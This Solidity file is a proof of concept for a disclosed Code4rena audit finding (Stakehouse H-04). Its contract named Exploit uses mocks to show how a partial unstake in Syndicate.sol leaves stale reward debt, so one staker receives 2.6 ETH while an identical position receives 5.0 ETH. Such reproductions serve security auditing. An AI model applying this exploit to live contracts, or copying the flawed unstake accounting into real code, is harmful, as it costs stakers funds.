// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

// Real-source Playground PoC for Code4rena 2022-11-stakehouse H-04.
// The vulnerable reward/unstake accounting is the REAL audited Syndicate.sol
// (imported unmodified from the registry `src/`); only the external Stakehouse
// core (knot registry + sETH token) is replaced by the audited repo's own mocks.
import {Syndicate} from "../src/syndicate/Syndicate.sol";
import {MockERC20} from "../src/testing/MockERC20.sol";
import {MockStakeHouseUniverse} from "../src/testing/MockStakeHouseUniverse.sol";
import {MockSlotRegistry} from "../src/testing/MockSlotRegistry.sol";
import {IStakeHouseUniverse} from "@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IStakeHouseUniverse.sol";
import {ISlotSettlementRegistry} from "@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/ISlotSettlementRegistry.sol";

/// @dev Thin getter-override harness — identical in spirit to the audited repo's
/// own `SyndicateMock`. Every reward/unstake path is the real inherited Syndicate.
contract SyndicateHarness is Syndicate {
    address public uni;
    address public slotReg;

    constructor(address _uni, address _slotReg, address _owner, bytes[] memory _keys) {
        uni = _uni;
        slotReg = _slotReg;
        _initialize(_owner, 0, new address[](0), _keys);
    }

    function getStakeHouseUniverse() internal view override returns (IStakeHouseUniverse) {
        return IStakeHouseUniverse(uni);
    }

    function getSlotRegistry() internal view override returns (ISlotSettlementRegistry) {
        return ISlotSettlementRegistry(slotReg);
    }
}

/// @dev A distinct staker identity (its own msg.sender) that forwards
/// stake/unstake/claim to the real Syndicate and can receive ETH rewards.
contract Staker {
    Syndicate public immutable synd;

    constructor(Syndicate _s) {
        synd = _s;
    }

    function stake(address token, bytes[] memory keys, uint256 amount) external {
        MockERC20(token).approve(address(synd), amount);
        uint256[] memory a = new uint256[](1);
        a[0] = amount;
        synd.stake(keys, a, address(this));
    }

    function unstake(bytes[] memory keys, uint256 amount) external {
        uint256[] memory a = new uint256[](1);
        a[0] = amount;
        synd.unstake(address(this), address(this), keys, a);
    }

    function claim(bytes[] memory keys) external {
        synd.claimAsStaker(address(this), keys);
    }

    receive() external payable {}
}

/// @notice Reproduces H-04 end-to-end against the real Syndicate accounting.
/// The Exploit contract itself plays an HONEST 2-sETH staker; a separate
/// `victim` staker holds the IDENTICAL 2-sETH position but reached it by
/// partially unstaking. Over one shared reward window the honest staker is paid
/// 5.0 ETH while the victim is paid only 2.6 ETH — a 2.4 ETH loss caused solely
/// by `unstake` leaving `sETHUserClaimForKnot` stale.
contract Exploit {
    bytes internal constant KNOT = hex"0102030405";
    address internal constant HOUSE = address(0xBEEF);

    MockERC20 public sETH;
    MockStakeHouseUniverse public uni;
    MockSlotRegistry public slot;
    SyndicateHarness public syndicate;
    Staker public victim;

    uint256 public victimPhase2Claim; // 2.6 ETH  (bugged, partially-unstaked position)
    uint256 public honestPhase2Claim; // 5.0 ETH  (this contract, identical position)
    uint256 public ethDeniedToVictim; // 2.4 ETH  (the loss)

    constructor() {
        uni = new MockStakeHouseUniverse();
        slot = new MockSlotRegistry();
        sETH = new MockERC20("sETH", "sETH", address(this)); // mints 125_000 sETH here

        uni.setAssociatedHouseForKnot(KNOT, HOUSE);
        slot.setShareTokenForHouse(HOUSE, address(sETH));

        bytes[] memory keys = new bytes[](1);
        keys[0] = KNOT;
        syndicate = new SyndicateHarness(address(uni), address(slot), address(this), keys);

        victim = new Staker(syndicate);
        sETH.transfer(address(victim), 10 ether);
    }

    function _keys() internal pure returns (bytes[] memory k) {
        k = new bytes[](1);
        k[0] = KNOT;
    }

    function _reward(uint256 amount) internal {
        (bool ok, ) = payable(address(syndicate)).call{value: amount}("");
        require(ok, "reward send failed");
    }

    /// Funded with exactly the reward ETH via msg.value, so the Exploit's net
    /// balance after run() equals its honest 5.0 ETH claim (the scored profit).
    function run() external payable {
        bytes[] memory keys = _keys();

        // --- Phase 0: victim stakes 5 sETH (accumulator = 0) ---
        victim.stake(address(sETH), keys, 5 ether);

        // --- Phase 1: 8 ETH of EIP-1559 rewards arrive ---
        _reward(8 ether);

        // Victim unstakes 3 sETH: the real `unstake` pays the 4 ETH owed on 5
        // shares and snapshots the claim-debt at accPerShare * 5, then cuts the
        // balance to 2 sETH WITHOUT recomputing the debt -> stale 4 ETH debt.
        victim.unstake(keys, 3 ether);
        require(syndicate.sETHStakedBalanceForKnot(KNOT, address(victim)) == 2 ether, "victim not at 2 sETH");
        require(syndicate.sETHUserClaimForKnot(KNOT, address(victim)) == 4 ether, "expected stale 4 ETH debt");

        // --- Phase 1b: the Exploit stakes a FRESH, honest 2 sETH ---
        sETH.approve(address(syndicate), 2 ether);
        uint256[] memory a = new uint256[](1);
        a[0] = 2 ether;
        syndicate.stake(keys, a, address(this));
        require(syndicate.sETHUserClaimForKnot(KNOT, address(this)) == 1.6 ether, "honest debt should be 1.6 ETH");

        // Identical remaining position: 2 sETH each.
        require(
            syndicate.sETHStakedBalanceForKnot(KNOT, address(victim)) ==
                syndicate.sETHStakedBalanceForKnot(KNOT, address(this)),
            "positions not identical"
        );

        // --- Phase 2: more rewards arrive; both claim over the SAME window ---
        _reward(20 ether); // syndicate ETH balance now 24

        uint256 vBefore = address(victim).balance;
        victim.claim(keys);
        victimPhase2Claim = address(victim).balance - vBefore;

        uint256 eBefore = address(this).balance;
        syndicate.claimAsStaker(address(this), keys);
        honestPhase2Claim = address(this).balance - eBefore;

        // --- Harm: identical positions, unequal pay ---
        ethDeniedToVictim = honestPhase2Claim - victimPhase2Claim;
        require(victimPhase2Claim == 2.6 ether, "victim claim != 2.6 ETH");
        require(honestPhase2Claim == 5.0 ether, "honest claim != 5.0 ETH");
        require(ethDeniedToVictim == 2.4 ether, "shortfall != 2.4 ETH");
    }

    receive() external payable {}
}
